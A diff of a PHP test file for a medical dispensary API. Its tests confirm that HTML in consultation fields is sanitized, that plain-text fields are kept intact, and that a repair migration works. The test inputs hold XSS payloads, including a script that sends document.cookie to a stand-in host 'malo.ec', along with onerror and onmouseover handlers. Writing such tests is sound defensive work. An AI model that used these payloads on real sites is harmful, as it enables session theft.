@@ -2248,7 +2248,7 @@ test('el_html_de_la_consulta_se_guarda_limpio', function () {
     $consulta = $this->postJson(
         '/api/v1/dispensario/consultas',
         datosDeConsulta($historia->id, [
-            'enfermedad_actual' => '<p>Dolor <strong>agudo</strong></p>'
+            'diagnostico_detallado' => '<p>Gastritis <strong>aguda</strong></p>'
                 . '<img src=x onerror="alert(1)">'
                 . '<script>fetch("//malo.ec?c="+document.cookie)</script>',
             'plan_tratamiento'  => '<p onmouseover="alert(2)">Reposo</p>'
@@ -2258,14 +2258,56 @@ test('el_html_de_la_consulta_se_guarda_limpio', function () {
 
     $enBase = App\Models\Dispensario\ConsultaMedica::find($consulta['id']);
 
-    // Se conserva el formato, se va el código.
-    expect($enBase->enfermedad_actual)->toBe('<p>Dolor <strong>agudo</strong></p>');
-    expect($enBase->enfermedad_actual)->not->toContain('script');
-    expect($enBase->enfermedad_actual)->not->toContain('onerror');
+    // Se conserva el formato, se va el código. Es el diagnóstico el que se
+    // escribe con el editor y se pinta como HTML: la lista de campos decía la
+    // anamnesis, y el diagnóstico se guardaba tal cual llegaba.
+    expect($enBase->diagnostico_detallado)->toBe('<p>Gastritis <strong>aguda</strong></p>');
 
     expect($enBase->plan_tratamiento)->not->toContain('onmouseover');
     expect($enBase->plan_tratamiento)->not->toContain('javascript:');
     expect($enBase->plan_tratamiento)->toContain('Reposo');
+});
+
+test('la_anamnesis_es_texto_y_se_guarda_como_se_escribio', function () {
+    $this->medico->assignRole(Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    ));
+    $this->actingAs($this->medico, 'sanctum');
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    // Se escribe en un área de texto y se pinta como texto. Pasarla por el
+    // saneador la mutilaba: el `<` desaparecía y el `+` quedaba `&#43;`.
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id, [
+            'enfermedad_actual' => 'TA < 140, dolor + fiebre, SatO2=95% @ reposo',
+        ])
+    )->assertCreated()->json('datos');
+
+    expect(App\Models\Dispensario\ConsultaMedica::find($consulta['id'])->enfermedad_actual)
+        ->toBe('TA < 140, dolor + fiebre, SatO2=95% @ reposo');
+});
+
+test('un_diagnostico_en_texto_se_escapa_y_no_pierde_nada', function () {
+    $this->medico->assignRole(Spatie\Permission\Models\Role::firstOrCreate(
+        ['name' => 'medico', 'guard_name' => 'sanctum']
+    ));
+    $this->actingAs($this->medico, 'sanctum');
+
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    // Sin etiquetas no es HTML: sanearlo se comería el `<`. Escapado, se pinta
+    // como HTML y se lee igual que se escribió.
+    $consulta = $this->postJson(
+        '/api/v1/dispensario/consultas',
+        datosDeConsulta($historia->id, [
+            'diagnostico_detallado' => 'HTA con TA < 140 & cefalea',
+        ])
+    )->assertCreated()->json('datos');
+
+    expect(App\Models\Dispensario\ConsultaMedica::find($consulta['id'])->diagnostico_detallado)
+        ->toBe('HTA con TA &lt; 140 &amp; cefalea');
 });
 
 test('el_html_tambien_se_limpia_al_corregir', function () {
@@ -2286,12 +2328,51 @@ test('el_html_tambien_se_limpia_al_corregir', function () {
         'tipo_atencion'         => 'primera_vez',
         'tipo_diagnostico'      => 'definitivo',
         'motivo_consulta'       => 'Dolor abdominal',
-        'diagnostico_detallado' => 'Gastritis',
-        'enfermedad_actual'     => '<p>Ok</p><script>alert(1)</script>',
+        'diagnostico_detallado' => '<p>Ok</p><script>alert(1)</script>',
     ])->assertOk();
 
     expect(App\Models\Dispensario\ConsultaMedica::find($consulta['id'])
-        ->enfermedad_actual)->toBe('<p>Ok</p>');
+        ->diagnostico_detallado)->toBe('<p>Ok</p>');
+});
+
+test('la_migracion_sanea_el_diagnostico_y_repara_la_anamnesis', function () {
+    $historia = historiaDePrueba($this->paciente->id, $this->paciente->cedula);
+
+    // Como quedaron las consultas guardadas: el diagnóstico sin sanear, y la
+    // anamnesis con las entidades que le puso el saneador.
+    $consulta = App\Models\Dispensario\ConsultaMedica::create([
+        ...datosDeConsulta($historia->id),
+        'medico_id'             => $this->medico->id,
+        'especialidad'          => 'medicina_general',
+        'diagnostico_detallado' => '<p>Gastritis</p><img src=x onerror="alert(1)">',
+        'enfermedad_actual'     => 'dolor &#43; fiebre, SatO2&#61;95%',
+    ]);
+    $enTexto = App\Models\Dispensario\ConsultaMedica::create([
+        ...datosDeConsulta($historia->id),
+        'medico_id'             => $this->medico->id,
+        'especialidad'          => 'medicina_general',
+        'diagnostico_detallado' => 'Previo al editor: TA < 140',
+    ]);
+    $version = App\Models\Dispensario\VersionConsultaMedica::create([
+        'consulta_medica_id'    => $consulta->id,
+        'tipo_atencion'         => 'primera_vez',
+        'tipo_diagnostico'      => 'presuntivo',
+        'motivo_consulta'       => 'Dolor',
+        'diagnostico_detallado' => '<p onclick="x()">Antes</p>',
+        'enfermedad_actual'     => 'tos &amp; fiebre',
+        'reemplazada_por'       => $this->medico->id,
+    ]);
+
+    $migracion = require database_path(
+        'migrations/2026_11_15_000000_sanear_diagnostico_y_reparar_anamnesis_de_consultas.php'
+    );
+    $migracion->up();
+
+    expect($consulta->fresh()->diagnostico_detallado)->toBe('<p>Gastritis</p>')
+        ->and($consulta->fresh()->enfermedad_actual)->toBe('dolor + fiebre, SatO2=95%')
+        ->and($enTexto->fresh()->diagnostico_detallado)->toBe('Previo al editor: TA &lt; 140')
+        ->and($version->fresh()->diagnostico_detallado)->toBe('<p>Antes</p>')
+        ->and($version->fresh()->enfermedad_actual)->toBe('tos & fiebre');
 });
 test('solo_quien_atendio_puede_corregir_su_consulta', function () {
     $rolMedico = Spatie\Permission\Models\Role::firstOrCreate(
